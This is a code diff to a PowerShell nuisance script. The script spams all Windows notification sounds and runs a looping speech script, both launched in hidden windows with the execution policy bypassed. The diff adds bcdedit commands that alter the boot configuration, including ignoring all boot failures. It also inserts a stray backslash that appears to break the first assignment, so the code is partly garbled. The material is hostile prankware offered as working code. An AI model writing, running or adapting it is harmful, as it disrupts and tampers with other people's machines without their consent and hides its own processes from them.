@@ -1,7 +1,7 @@
-$notificationScriptContent = @'
+\$notificationScriptContent = @'
 Function Send-NotificationSoundSpam {
     param ([int]$Interval = 0)
-    
+
     Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | ForEach-Object {
         (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").PlaySync()
         Start-Sleep -Milliseconds 1
@@ -33,6 +33,10 @@ while ($true) {
 '@
 $speechScriptPath = "$PWD\speech.ps1"
 Set-Content -Path $speechScriptPath -Value $speechScriptContent
+
+bcdedit /set {current} bootmenupolicy legacy
+bcdedit /set {current} recoveryenabled yes
+bcdedit /set {current} bootstatuspolicy ignoreallfailures
 
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$notificationScriptPath`""
